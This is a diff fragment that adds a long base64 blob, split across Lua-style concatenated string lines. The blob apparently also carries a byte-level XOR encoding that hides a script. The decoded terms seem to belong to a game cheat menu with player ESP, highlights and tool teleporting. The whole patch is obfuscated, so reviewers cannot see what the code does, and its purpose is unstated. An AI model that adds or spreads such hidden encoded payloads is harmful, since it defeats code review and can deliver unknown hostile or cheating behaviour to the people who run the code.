+    .. "/fDx5rzvnrS0tLTa9fnxtKm0ttPm9eL94O22uJ60tLS0xvX68/G0qbTvpLi0oaSk6bietLS0"
+    .. "tN369+bx+fH64LSptKW4nrS0tLTH4fLy/ey0qbS2tNO2uJ60tLS01+Hm5vH64ML1+OHxtKm0"
+    .. "pa2iuJ60tLS00vj187SptLbT5vXi/eDttrietLS0tNf1+Pj29ff/tKm08uH69+D9+/q84vX4"
+    .. "4fG9nrS0tLS0tLS09+Hn4Pv50+b14v3g7bSptOL1+OHxnrS0tLS0tLS0/fK09+Hn4Pv50+b1"
+    .. "4v3g7dH69fb48fC04Pzx+p60tLS0tLS0tLS0tLTj++b/5+T19/G60+b14v3g7bSptOL1+OHx"
+    .. "nrS0tLS0tLS08frwnrS0tLTx+vCe6b2enrm5u7upqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqameubm7u7Ta29fY3cSeubm7u6mpqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqZ6ewfr94vHm"
+    .. "5/X4wPX2rtfm8fXg8cD78/P48bzvnp60tLS02vX58bSptLba+/f4/eS2uJ6etLS0tNfh5ubx"
+    .. "+uDC9fjh8bSptPL1+OfxuJ6etLS0tNL49fO0qbS22vv3+P3ktrienrS0tLTX9fj49vX3/7Sp"
+    .. "tPLh+vfg/fv6vPH69fb48fC9np60tLS0tLS0tPr79/j95LSpnrS0tLS0tLS0tLS0tPH69fb4"
+    .. "8fCenrS0tLS0tLS0/fK0+vv3+P3k1/v6+vH34P37+rTg/PH6np60tLS0tLS0tLS0tLT6+/f4"
+    .. "/eTX+/r68ffg/fv6rtD95/f7+vrx9+C8vZ6etLS0tLS0tLS0tLS0+vv3+P3k1/v6+vH34P37"
+    .. "+rSptPr9+J6etLS0tLS0tLTx+vCenrS0tLS0tLS0/fK0+vvgtPH69fb48fCetLS0tLS0tLS0"
+    .. "tLS09frwtNf89eb19+Dx5rTg/PH6np60tLS0tLS0tLS0tLTy++a0y7i05PXm4LT9+rT95PX9"
+    .. "5ue8nrS0tLS0tLS0tLS0tLS0tLTX/PXm9ffg8eau0/Hg0PHn9/H68PX64Oe8vZ60tLS0tLS0"
+    .. "tLS0tLS9tPD7np60tLS0tLS0tLS0tLS0tLS0/fK05PXm4K7d59W8ttb15/HE9ebgtr204Pzx"
+    .. "+p60tLS0tLS0tLS0tLS0tLS0tLS0tOT15uC61/X61/v4+P3w8bSptODm4fGetLS0tLS0tLS0"
+    .. "tLS0tLS0tPH68J6etLS0tLS0tLS0tLS08frwnp60tLS0tLS0tLS0tLTm8eDh5vqenrS0tLS0"
+    .. "tLS08frwnp60tLS0tLS0tPr79/j95Nf7+vrx9+D9+/q0qZ60tLS0tLS0tLS0tLTG4frH8ebi"
+    .. "/ffxusfg8eTk8fCu1/v6+vH34LyetLS0tLS0tLS0tLS0tLS0tPLh+vfg/fv6vL2enrS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0/fK0+vvgtPr79/j95J60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLT7"
+    .. "5rT6++C01/z15vX34PHmtOD88fqenrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tObx4OHm+p6e"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tLTx+vCenrS0tLS0tLS0tLS0tLS0tLS0tLS08vvmtMu4tOT1"
+    .. "5uC0/fq0/eT1/ebnvJ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTX/PXm9ffg8eau0/Hg0PHn"
+    .. "9/H68PX64Oe8vZ60tLS0tLS0tLS0tLS0tLS0tLS0tL208PuenrS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tP3ytOT15uCu3efVvLbW9efxxPXm4La9tOD88fqetLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tOT15uC61/X61/v4+P3w8bSptPL1+OfxnrS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tPH68J6etLS0tLS0tLS0tLS0tLS0tLS0tLTx+vCenrS0tLS0tLS0tLS0tLS0tLTx+vCe"
+    .. "tLS0tLS0tLS0tLS0vZ6etLS0tPH68J6e6b2enrm5u7upqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqameubm7u7TSwdjY1sbd09zAnrm5u7up"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqame"
+    .. "nsH6/eLx5uf1+MD19q7X5vH14PHA+/Pz+PG8756etLS0tNr1+fG0qbS20uH4+Pbm/fP84La4"
+    .. "np60tLS01+Hm5vH64ML1+OHxtKm08vX45/G4np60tLS00vj187SptLbS4fj49ub98/zgtrie"
+    .. "nrS0tLTX9fj49vX3/7SptPLh+vfg/fv6vPH69fb48fC9np60tLS0tLS0tPLh+Pj25v3z/OC0"
+    .. "qZ60tLS0tLS0tLS0tLTx+vX2+PHwnp60tLS0tLS0tP3ytPLh+Pj25v3z/ODX+/r68ffg/fv6"
+    .. "tOD88fqenrS0tLS0tLS0tLS0tPLh+Pj25v3z/ODX+/r68ffg/fv6rtD95/f7+vrx9+C8vZ6e"
+    .. "tLS0tLS0tLS0tLS08uH4+Pbm/fP84Nf7+vrx9+D9+/q0qbT6/fienrS0tLS0tLS08frwnp60"
+    .. "tLS0tLS0tP3ytPH69fb48fC04Pzx+p6etLS0tLS0tLS0tLS08uH4+Pbm/fP84Nf7+vrx9+D9"
+    .. "+/q0qZ60tLS0tLS0tLS0tLS0tLS0xuH6x/Hm4v338brG8frw8ebH4PHk5PHwrtf7+vrx9+C8"
+    .. "nrS0tLS0tLS0tLS0tLS0tLS0tLS08uH69+D9+/q8vZ6etLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS02P3z/OD9+vO61ub98/zg+vHn57SptKaetLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS02P3z"
+    .. "/OD9+vO61/j79//A/fnxtKm0paCetLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS02P3z/OD9+vO6"
+    .. "0vvz0frwtKm0paSkpKSknrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tNj98/zg/frzutP4+/b1"
+    .. "+Mf89fD74+e0qbTy9fjn8Z6etLS0tLS0tLS0tLS0tLS0tLS0tLTx+vCetLS0tLS0tLS0tLS0"
+    .. "tLS0tL2enrS0tLS0tLS08fjn8Z6etLS0tLS0tLS0tLS02P3z/OD9+vO61ub98/zg+vHn57Sp"
+    .. "nrS0tLS0tLS0tLS0tLS0tLT75v3z/fr1+Nj98/zg/frzutbm/fP84Prx5+eenrS0tLS0tLS0"
+    .. "tLS0tNj98/zg/frzutf4+/f/wP358bSpnrS0tLS0tLS0tLS0tLS0tLT75v3z/fr1+Nj98/zg"
+    .. "/frzutf4+/f/wP358Z6etLS0tLS0tLS0tLS02P3z/OD9+vO60vvz0frwtKmetLS0tLS0tLS0"
+    .. "tLS0tLS0tPvm/fP9+vX42P3z/OD9+vO60vvz0frwnp60tLS0tLS0tLS0tLTY/fP84P3687rT"
+    .. "+Pv29fjH/PXw++PntKmetLS0tLS0tLS0tLS0tLS0tPvm/fP9+vX42P3z/OD9+vO60/j79vX4"
+    .. "x/z18Pvj556etLS0tLS0tLTx+vCenrS0tLTx+vCenum9np65ubu7qampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampnrm5u7u009XZ0bTc0dXQ"
+    .. "0caeubm7u6mpqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqZ6e0/X58cD19q7X5vH14PHE9eb18+b15Py8756etLS0tMD94PjxtKm0tnYIMrTA"
+    .. "1cbT0cDd2tO0srTC3cfB1djHtLS7tLTX29nW1cC2uJ6etLS0tNf7+uDx+uC0qZ60tLS0tLS0"
+    .. "tLbV8OL1+vfx8LTk+PXt8ea04v3n4fX4/e714P37+rT1+vC04PXm8/Hg/frztPf7+uDm+/jn"
+    .. "uraenum9np65ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampnrm5u7u00cfEtLu01dDC1drX0dC0wt3HwdXYx565ubu7qampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampnp7T9fnxwPX2"
+    .. "rtfm8fXg8cfx9+D9+/q8tsLdx8HV2Me0tLu0tNXQwtXa19HQtNHHxLa9np74+/f1+LTy4fr3"
+    .. "4P37+rTz8eDA8fX51/v4++a85Pj17fHmvZ60tLS0/fK08efkwPH1+df7+Pvm57T1+vC05Pj1"
+    .. "7fHmusDx9fm04Pzx+p60tLS0tLS0tObx4OHm+rTk+PXt8ea6wPH1+brA8fX51/v4++a61/v4"
+    .. "++aetLS0tPH68J60tLS05vHg4eb6tNf7+Pvmp7ry5vv5xtPWvKS4tKWtpLi0pqGhvZ7x+vCe"
+    .. "nvj79/X4tPLh+vfg/fv6tObx+fvi8dHHxLzk+PXt8ea9nrS0tLT4+/f1+LTw9eD1tKm08efk"
+    .. "2/b+8ffg58/k+PXt8ebJnrS0tLT98rT6++C08PXg9bTg/PH6tObx4OHm+rTx+vCetLS0tP3y"
+    .. "tPD14PW63P3z/Pj98/zgtOD88fq08PXg9brc/fP8+P3z/OCu0PHn4Ob77by9tPH68J60tLS0"
+    .. "/fK08PXg9brW/fj49vv15vC04Pzx+rTw9eD1utb9+Pj2+/Xm8K7Q8efg5vvtvL208frwnrS0"
+    .. "tLTx5+Tb9v7x9+Dnz+T49e3x5sm0qbT6/fie8frwnp74+/f1+LTy4fr34P37+rT35vH14PHR"
+    .. "x8S85Pj17fHmvZ60tLS0/fK05Pj17fHmtKmptNj79/X4xPj17fHmtOD88fq05vHg4eb6tPH6"
+    .. "8J60tLS05vH5++Lx0cfEvOT49e3x5r2etLS0tP3ytPr74LTx5+TR+vX2+PHwtOD88fq05vHg"
+    .. "4eb6tPH68J6etLS0tPj79/X4tPf89eb19+Dx5rSptOT49e3x5rrX/PXm9ffg8eaetLS0tPj7"
+    .. "9/X4tPzx9fC0qbT3/PXm9ffg8ea09frwtPf89eb19+Dx5q7S/frw0v3m5+DX/P348Ly23PH1"
+    .. "8La9nrS0tLT98rT6++C09/z15vX34PHmtPvmtPr74LT88fXwtOD88fq05vHg4eb6tPH68J6e"
+    .. "tLS0tPj79/X4tPz98/z4/fP84LSptN365+D1+vfxuvrx47y23P3z/Pj98/zgtr2etLS0tPz9"
+    .. "8/z4/fP84Lra9fnxtKm0tsfk9ffx3OH2y9HHxLaetLS0tPz98/z4/fP84LrV8Pvm+vHxtKm0"
+    .. "9/z15vX34PHmnrS0tLT8/fP8+P3z/OC60PHk4PzZ+/DxtKm00frh+brc/fP8+P3z/ODQ8eTg"
+    .. "/Nn78PG61fjj9e3n2/rA++SetLS0tPz98/z4/fP84LrS/fj4wOb1+ufk9ebx+vfttKm0pLqj"
+    .. "pp60tLS0/P3z/Pj98/zgutvh4Pj9+vHA5vX65+T15vH69+20qbSknrS0tLT8/fP8+P3z/OC6"
+    .. "0v34+Nf7+PvmtKm08/HgwPH1+df7+PvmvOT49e3x5r2etLS0tPz98/z4/fP84Lrb4eD4/frx"
+    .. "1/v4++a0qbTz8eDA8fX51/v4++a85Pj17fHmvZ60tLS0/P3z/Pj98/zgusT15vH64LSptPf8"
+    .. "9eb19+Dx5p6etLS0tPj79/X4tPb9+Pj2+/Xm8LSptN365+D1+vfxuvrx47y21v34+Pb79ebw"
+    .. "0+H9tr2etLS0tPb9+Pj2+/Xm8Lra9fnxtKm0tsfk9ffx3OH2y8T49e3x5t368vu2nrS0tLT2"
+    .. "/fj49vv15vC61fD75vrx8bSptPzx9fCetLS0tPb9+Pj2+/Xm8LrH/e7xtKm0wdD9+aa68ub7"
+    .. "+dvy8ufx4LymoqS4tKOmvZ60tLS09v34+Pb79ebwusfg4fDn2/Ly5/HgtKm0wvH34Pvmp7r6"
+    .. "8eO8pLi0p7qmuLSkvZ60tLS09v34+Pb79ebwutX44/Xt59v6wPvktKm04Obh8Z60tLS09v34"
+    .. "+Pb79ebwusT15vH64LSptPzx9fCenrS0tLT4+/f1+LT49fbx+LSptN365+D1+vfxuvrx47y2"
+    .. "wPHs4Nj19vH4tr2etLS0tPj19vH4utr1+fG0qbS23fry+7aetLS0tPj19vH4usf97vG0qbTB"
+    .. "0P35prry5vv5x/f1+PG8pbi0pb2etLS0tPj19vH4utb19//z5vvh+vDA5vX65+T15vH69+20"
+    .. "qbSlnrS0tLT49fbx+LrS+/rgtKm00frh+brS+/rgutP74Pz1+db7+PCetLS0tPj19vH4usDx"
+    .. "7ODH/e7xtKm0paeetLS0tPj19vH4usDx7ODD5vXk5PHwtKm04Obh8Z60tLS0+PX28fi6wPHs"
+    .. "4Nf7+Pvmp7SptPPx4MDx9fnX+/j75rzk+PXt8ea9nrS0tLT49fbx+LrA8ezgx+Dm+//xwOb1"
+    .. "+ufk9ebx+vfttKm0pJ60tLS0+PX28fi6wPHs4Mfg5vv/8df7+Pvmp7SptNf7+Pvmp7ry5vv5"
+    .. "xtPWvKG4tKWkuLSmpL2etLS0tPj19vH4usT15vH64LSptPb9+Pj2+/Xm8J6etLS0tPHn5Nv2"
+    .. "/vH34OfP5Pj17fHmybSptO+etLS0tLS0tLTc/fP8+P3z/OC0qbT8/fP8+P3z/OC4nrS0tLS0"
+    .. "tLS01v34+Pb79ebwtKm09v34+Pb79ebwuJ60tLS0tLS0tNj19vH4tKm0+PX28fietLS0tOme"
+    .. "8frwnp74+/f1+LTy4fr34P37+rTm8fLm8ef80cfEvL2etLS0tPL75rTk+PXt8ea0/fq05PX9"
+    .. "5ue88efk2/b+8ffg57208PuetLS0tLS0tLT98rT6++C05Pj17fHmusT15vH64LT75rT6++C0"
+    .. "8efk0fr19vjx8LTg/PH6nrS0tLS0tLS0tLS0tObx+fvi8dHHxLzk+PXt8ea9nrS0tLS0tLS0"
+    .. "8frwnrS0tLTx+vCetLS0tP3ytPr74LTx5+TR+vX2+PHwtOD88fq05vHg4eb6tPH68J60tLS0"
+    .. "8vvmtMu4tOT49e3x5rT9+rT95PX95ue8xPj17fHm567T8eDE+PXt8ebnvL29tPD7nrS0tLS0"
+    .. "tLS0/fK05Pj17fHmtOqptNj79/X4xPj17fHmtOD88fqetLS0tLS0tLS0tLS09+bx9eDx0cfE"
+    .. "vOT49e3x5r2etLS0tLS0tLTx+vCetLS0tPH68J7x+vCentP1+fHA9fau1+bx9eDxwPvz8/jx"
+    .. "vO+etLS0tNr1+fG0qbS2xPj17fHmtNHHxLa4nrS0tLTX4ebm8frgwvX44fG0qbTy9fjn8bie"
+    .. "tLS0tNL49fO0qbS20cfEtrietLS0tNf1+Pj29ff/tKm08uH69+D9+/q88fr19vjx8L2etLS0"
+    .. "tLS0tLTx5+TR+vX2+PHwtKm08fr19vjx8J60tLS0tLS0tObx8ubx5/zRx8S8vZ60tLS08frw"
+    .. "num9np7T9fnxwPX2rtfm8fXg8cD78/P48bzvnrS0tLTa9fnxtKm0tsf8++O02vX58ba4nrS0"
+    .. "tLTX4ebm8frgwvX44fG0qbTg5uHxuJ60tLS00vj187SptLbRx8Ta9fnxtrietLS0tNf1+Pj2"
+    .. "9ff/tKm08uH69+D9+/q84vX44fG9tPHn5Mf8++Pa9fnxtKm04vX44fG08frwnum9np7T9fnx"
+    .. "wPX2rtfm8fXg8cD78/P48bzvnrS0tLTa9fnxtKm0tsf8++O03PH1+OD8trietLS0tNfh5ubx"
+    .. "+uDC9fjh8bSptODm4fG4nrS0tLTS+PXztKm0ttHHxNzx9fjg/La4nrS0tLTX9fj49vX3/7Sp"
+    .. "tPLh+vfg/fv6vOL1+OHxvbTx5+TH/Pvj3PH1+OD8tKm04vX44fG08frwnum9np7T9fnxwPX2"
+    .. "rtfm8fXg8cD78/P48bzvnrS0tLTa9fnxtKm0tsf8++O00P3n4PX69/G2uJ60tLS01+Hm5vH6"
+    .. "4ML1+OHxtKm04Obh8bietLS0tNL49fO0qbS20cfE0P3n4PX69/G2uJ60tLS01/X4+Pb19/+0"
+    .. "qbTy4fr34P37+rzi9fjh8b208efkx/z749D95+D1+vfxtKm04vX44fG08frwnum9np7T9fnx"
+    .. "wPX2rtfm8fXg8cD78/P48bzvnrS0tLTa9fnxtKm0tsDx9fm01/v4++bntrietLS0tNfh5ubx"
+    .. "+uDC9fjh8bSptODm4fG4nrS0tLTS+PXztKm0ttHHxMDx9fnX+/j75ue2uJ60tLS01/X4+Pb1"
+    .. "9/+0qbTy4fr34P37+rzi9fjh8b2etLS0tLS0tLTx5+TA8fX51/v4++bntKm04vX44fGetLS0"
+    .. "tLS0tLTm8fLm8ef80cfEvL2etLS0tPH68J7pvZ6e0/X58cD19q7X5vH14PHH+P3w8ea87560"
+    .. "tLS02vX58bSptLbRx8S02fXs/fnh+bTQ/efg9fr38ba4nrS0tLTG9frz8bSptO+lpKS4tKGk"
+    .. "pKTpuJ60tLS03fr35vH58frgtKm0oaS4nrS0tLTH4fLy/ey0qbS2tOfg4fDntrietLS0tNfh"
+    .. "5ubx+uDC9fjh8bSptKWkpKS4nrS0tLTS+PXztKm0ttHHxNn17ND95+D1+vfxtrietLS0tNf1"
+    .. "+Pj29ff/tKm08uH69+D9+/q84vX44fG9tPHn5Nn17ND95+D1+vfxtKm04vX44fG08frwnum9"
+    .. "np7T9fnxwPX2rtfm8fXg8dbh4OD7+rzvnrS0tLTa9fnxtKm0tsbx8ubx5/y0xPj17fHmtML9"
+    .. "5+H1+Oe2uJ60tLS01/X4+Pb19/+0qbTy4fr34P37+ry9nrS0tLS0tLS05vHy5vHn/NHHxLy9"
+    .. "nrS0tLS0tLS0xvXt8v3x+PCu2vvg/fLtvO+etLS0tLS0tLS0tLS0wP3g+PG0qbS2wt3HwdXY"
+    .. "tMfNx8DR2ba4nrS0tLS0tLS0tLS0tNf7+uDx+uC0qbS21fDi9fr38fC05Pj17fHmtOL95+H1"
+    .. "+Oe05+369/zm+/r97vHwura4nrS0tLS0tLS0tLS0tNDh5vXg/fv6tKm0p7ietLS0tLS0tLS0"
+    .. "tLS03fn18/G0qbS25+T15v/48ee2nrS0tLS0tLS06b2etLS0tPH68J7pvZ6eubm7u6mpqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqZ65ubu7"
+    .. "tMDb29i00cfEtLu00MbbxMTR0LTdwNHZx565ubu7qampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampnp74+/f1+LTy4fr34P37+rTz8eDA+/v4"
+    .. "xPXm4Lzg+/v4vZ60tLS0/fK0+vvgtOD7+/i0++a0+vvgtOD7+/iu3efVvLbA+/v4tr204Pzx"
+    .. "+p60tLS0tLS0tObx4OHm+rT6/fietLS0tPH68J6etLS0tPj79/X4tPz1+vD48bSptOD7+/iu"
+    .. "0v368NL95ufg1/z9+PC8ttz1+vD48ba9nrS0tLT98rT89frw+PG09frwtPz1+vD48a7d59W8"
+    .. "ttb15/HE9ebgtr204Pzx+p60tLS0tLS0tObx4OHm+rT89frw+PGetLS0tPH68J6etLS0tPL7"
+    .. "5rTLuLTw8ef38frw9frgtP36tP3k9f3m57zg+/v4rtPx4NDx5/fx+vD1+uDnvL29tPD7nrS0"
+    .. "tLS0tLS0/fK08PHn9/H68PX64K7d59W8ttb15/HE9ebgtr204Pzx+p60tLS0tLS0tLS0tLTm"
+    .. "8eDh5vq08PHn9/H68PX64J60tLS0tLS0tPH68J60tLS08frwnp60tLS05vHg4eb6tPr9+J7x"
+    .. "+vCenvj79/X4tPLh+vfg/fv6tP3n0Ob75OTx8MD7+/i84Pv7+L2etLS0tP3ytPr74LTg+/v4"
+    .. "tPvmtPr74LTg+/v4rt3n1by2wPv7+La9tPvmtPr74LTg+/v4rt3n0PHn9/H68PX64NvyvOP7"
+    .. "5v/n5PX38b204Pzx+p60tLS0tLS0tObx4OHm+rTy9fjn8Z60tLS08frwnp60tLS0ubm0wPv7"
+    .. "+Oe0/frn/fDxtPW05Pj17fHms+e09/z15vX34PHmtPXm8bTx5eH95OTx8Li0+vvgtPDm++Tk"
+    .. "8fC6nrS0tLTy++a0y7i05Pj17fHmtP36tP3k9f3m57zE+PXt8ebnrtPx4MT49e3x5ue8vb20"
+    .. "8PuetLS0tLS0tLT98rTk+PXt8ea61/z15vX34PHmtPX68LTg+/v4rt3n0PHn9/H68PX64Nvy"
+    .. "vOT49e3x5rrX/PXm9ffg8ea9tOD88fqetLS0tLS0tLS0tLS05vHg4eb6tPL1+OfxnrS0tLS0"
+    .. "tLS08frwnrS0tLTx+vCenrS0tLTm8eDh5vq04Obh8Z7x+vCenvj79/X4tPLh+vfg/fv6tObx"
+    .. "+fvi8cD7+/jRx8S84Pv7+L2etLS0tPj79/X4tPD14PW0qbTg+/v40efk2/b+8ffg58/g+/v4"
+    .. "yZ60tLS0/fK0+vvgtPD14PW04Pzx+p60tLS0tLS0tObx4OHm+p60tLS08frwnp60tLS0/fK0"
+    .. "8PXg9brc/fP8+P3z/OC04Pzx+p60tLS0tLS0tPD14PW63P3z/Pj98/zgrtDx5+Dm++28vZ60"
+    .. "tLS08frwnp60tLS0/fK08PXg9brW/fj49vv15vC04Pzx+p60tLS0tLS0tPD14PW61v34+Pb7"
+    .. "9ebwrtDx5+Dm++28vZ60tLS08frwnp60tLS04Pv7+NHn5Nv2/vH34OfP4Pv7+Mm0qbT6/fie"
+    .. "8frwnp74+/f1+LTy4fr34P37+rT35vH14PHA+/v40cfEvOD7+/i9nrS0tLT98rT6++C04Pv7"
+    .. "+NHn5NH69fb48fC0++a0+vvgtP3n0Ob75OTx8MD7+/i84Pv7+L204Pzx+p60tLS0tLS0tObx"
+    .. "4OHm+p60tLS08frwnp60tLS0+Pv39fi05PXm4LSptPPx4MD7+/jE9ebgvOD7+/i9nrS0tLT9"
+    .. "8rT6++C05PXm4LTg/PH6nrS0tLS0tLS05vHg4eb6nrS0tLTx+vCenrS0tLTm8fn74vHA+/v4"
+    .. "0cfEvOD7+/i9np60tLS0+Pv39fi0/P3z/Pj98/zgtKm03frn4PX69/G6+vHjvLbc/fP8+P3z"
+    .. "/OC2vZ60tLS0/P3z/Pj98/zgutr1+fG0qbS2x+T19/Hc4fbLwPv7+NHHxLaetLS0tPz98/z4"
+    .. "/fP84LrV8Pvm+vHxtKm04Pv7+J60tLS0/P3z/Pj98/zgutDx5OD82fvw8bSptNH64fm63P3z"
+    .. "/Pj98/zg0PHk4PzZ+/DxutX44/Xt59v6wPvknrS0tLT8/fP8+P3z/OC60v34+MDm9frn5PXm"
+    .. "8fr37bSptKS6o6aetLS0tPz98/z4/fP84Lrb4eD4/frxwOb1+ufk9ebx+vfttKm0pJ60tLS0"
+    .. "/P3z/Pj98/zgutL9+PjX+/j75rSptNf7+Pvmp7ry5vv5xtPWvKahobi0pa2kuLSjpL2etLS0"
+    .. "tPz98/z4/fP84Lrb4eD4/frx1/v4++a0qbTX+/j75qe68ub7+cbT1rymoaG4tKamobi0paek"
+    .. "vZ60tLS0/P3z/Pj98/zgusT15vH64LSptOD7+/ienrS0tLT4+/f1+LT2/fj49vv15vC0qbTd"
+    .. "+ufg9fr38br68eO8ttb9+Pj2+/Xm8NPh/ba9nrS0tLT2/fj49vv15vC62vX58bSptLbH5PX3"
+    .. "8dzh9svA+/v43fry+7aetLS0tPb9+Pj2+/Xm8LrV8Pvm+vHxtKm05PXm4J60tLS09v34+Pb7"
+    .. "9ebwusf97vG0qbTB0P35prry5vv52/Ly5/HgvKagpLi0oKy9nrS0tLT2/fj49vv15vC6x+Dh"
+    .. "8Ofb8vLn8eC0qbTC8ffg++anuvrx47ykuLSmuqa4tKS9nrS0tLT2/fj49vv15vC61fjj9e3n"
+    .. "2/rA++S0qbTg5uHxnrS0tLT2/fj49vv15vC6xPXm8frgtKm05PXm4J6etLS0tPj79/X4tPj1"
+    .. "9vH4tKm03frn4PX69/G6+vHjvLbA8ezg2PX28fi2vZ60tLS0+PX28fi62vX58bSptLbd+vL7"
+    .. "tp60tLS0+PX28fi6x/3u8bSptMHQ/fmmuvLm+/nH9/X48byluLSlvZ60tLS0+PX28fi61vX3"
+    .. "//Pm++H68MDm9frn5PXm8fr37bSptKWetLS0tPj19vH4utL7+uC0qbTR+uH5utL7+uC60/vg"
+    .. "/PX51vv48J60tLS0+PX28fi6wPHs4Mf97vG0qbSlp560tLS0+PX28fi6wPHs4MPm9eTk8fC0"
+    .. "qbTg5uHxnrS0tLT49fbx+LrA8ezg1/v4++antKm01/v4++anuvLm+/nG09a8pqGhuLSmpqS4"
+    .. "tKWmpL2etLS0tPj19vH4usDx7ODH4Ob7//HA5vX65+T15vH69+20qbSknrS0tLT49fbx+LrA"
+    .. "8ezgx+Dm+//x1/v4++antKm01/v4++anuvLm+/nG09a8pqS4tKWguLShvZ60tLS0+PX28fi6"
+    .. "wPHs4LSptLbA29vYtLR2FDa0tLa0urq04Pv7+Lra9fnxnrS0tLT49fbx+LrE9ebx+uC0qbT2"
+    .. "/fj49vv15vCenrS0tLTg+/v40efk2/b+8ffg58/g+/v4ybSptO+etLS0tLS0tLTc/fP8+P3z"
+    .. "/OC0qbT8/fP8+P3z/OC4nrS0tLS0tLS01v34+Pb79ebwtKm09v34+Pb79ebwuJ60tLS0tLS0"
+    .. "tNj19vH4tKm0+PX28fietLS0tOme8frwnp74+/f1+LTy4fr34P37+rTm8fLm8ef8wPv7+NHH"
+    .. "xLy9nrS0tLTy++a04Pv7+LT9+rTk9f3m57zg+/v40efk2/b+8ffg57208PuetLS0tLS0tLT9"
+    .. "8rT6++C04Pv7+LrE9ebx+uC0++a0+vvgtP3n0Ob75OTx8MD7+/i84Pv7+L20++a0+vvgtOD7"
+    .. "+/jR5+TR+vX2+PHwtOD88fqetLS0tLS0tLS0tLS05vH5++LxwPv7+NHHxLzg+/v4vZ60tLS0"
+    .. "tLS0tPH68J60tLS08frwnp60tLS0/fK0+vvgtOD7+/jR5+TR+vX2+PHwtOD88fqetLS0tLS0"
+    .. "tLTm8eDh5vqetLS0tPH68J6etLS0tPL75rTLuLTw8ef38frw9frgtP36tP3k9f3m57zj++b/"
+    .. "5+T19/Gu0/Hg0PHn9/H68PX64Oe8vb208PuetLS0tLS0tLT98rTw8ef38frw9frgrt3n1by2"
+    .. "wPv7+La9tOD88fqetLS0tLS0tLS0tLS09+bx9eDxwPv7+NHHxLzw8ef38frw9frgvZ60tLS0"
+    .. "tLS0tPH68J60tLS08frwnvH68J6e0/X58cD19q7X5vH14PHA+/Pz+PG87560tLS02vX58bSp"
+    .. "tLbA+/v4tNHHxLS0dhQ2tLTQ5vvk5PHwtN3g8fnntrietLS0tNfh5ubx+uDC9fjh8bSptPL1"
+    .. "+OfxuJ60tLS00vj187SptLbA+/v40cfEtrietLS0tNf1+Pj29ff/tKm08uH69+D9+/q88fr1"
+    .. "9vjx8L2etLS0tLS0tLTg+/v40efk0fr19vjx8LSptPH69fb48fCetLS0tLS0tLTm8fLm8ef8"
+    .. "wPv7+NHHxLy9np60tLS0tLS0tMb17fL98fjwrtr74P3y7bzvnrS0tLS0tLS0tLS0tMD94Pjx"
+    .. "tKm0tsDb29i00cfEtrietLS0tLS0tLS0tLS01/v64PH64LSptPH69fb48fC09frwtLbQ5vvk"
+    .. "5PHwtOD7+/jntPXm8bT6++O0/P3z/Pj98/zg8fC6trT75rS20Ob75OTx8LTg+/v4tOL95+H1"
+    .. "+Oe08P3n9fb48fC6trietLS0tLS0tLS0tLS00OHm9eD9+/q0qbSnuJ60tLS0tLS0tLS0tLTd"
+    .. "+fXz8bSptPH69fb48fC09frwtLbx7fG2tPvmtLbx7fG5+/Lytp60tLS0tLS0tOm9nrS0tLTx"
+    .. "+vCe6b2entP1+fHA9fau1+bx9eDxx/j98PHmvO+etLS0tNr1+fG0qbS2wPv7+LTRx8S02fXs"
+    .. "/fnh+bTQ/efg9fr38ba4nrS0tLTG9frz8bSptO+lpKS4tKWkpKSk6bietLS0tN369+bx+fH6"
+    .. "4LSptKGkuJ60tLS0x+Hy8v3stKm0trTn4OHw57a4nrS0tLTX4ebm8frgwvX44fG0qbSlpKSk"
+    .. "uJ60tLS00vj187SptLbA+/v40cfE2fXs0P3n4PX69/G2uJ60tLS01/X4+Pb19/+0qbTy4fr3"
+    .. "4P37+rzi9fjh8b2etLS0tLS0tLTg+/v40efk2fXs0P3n4PX69/G0qbTi9fjh8Z60tLS08frw"
+    .. "num9np7T9fnxwPX2rtfm8fXg8dbh4OD7+rzvnrS0tLTa9fnxtKm0tsbx8ubx5/y0wPv7+LTC"
+    .. "/efh9fjntrietLS0tNf1+Pj29ff/tKm08uH69+D9+/q8vZ60tLS0tLS0tObx8ubx5/zA+/v4"
+    .. "0cfEvL2enrS0tLS0tLS0xvXt8v3x+PCu2vvg/fLtvO+etLS0tLS0tLS0tLS0wP3g+PG0qbS2"
+    .. "wNvb2LTRx8S2uJ60tLS0tLS0tLS0tLTX+/rg8frgtKm0tsP75v/n5PX38bTg+/v457Tm8ef3"
+    .. "9fr68fC6trietLS0tLS0tLS0tLS00OHm9eD9+/q0qbSmuJ60tLS0tLS0tLS0tLTd+fXz8bSp"
+    .. "tLbm8fLm8ef8uffjtp60tLS0tLS0tOm9nrS0tLTx+vCe6b2enrm5u7upqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqameubm7u7TA29vYtMDR"
+    .. "2NHE28bAnrm5u7u01eHg+/n14P33tOD78/P48a604/zx+rTx+vX2+PHwuLT94LTn8fXm9/zx"
+    .. "57Ty++a04PzxtPrx9ebx5+Ceubm7u7Tw5vvk5PHwtMD7+/i09frwtODx+PHk++bg57Tg/PG0"
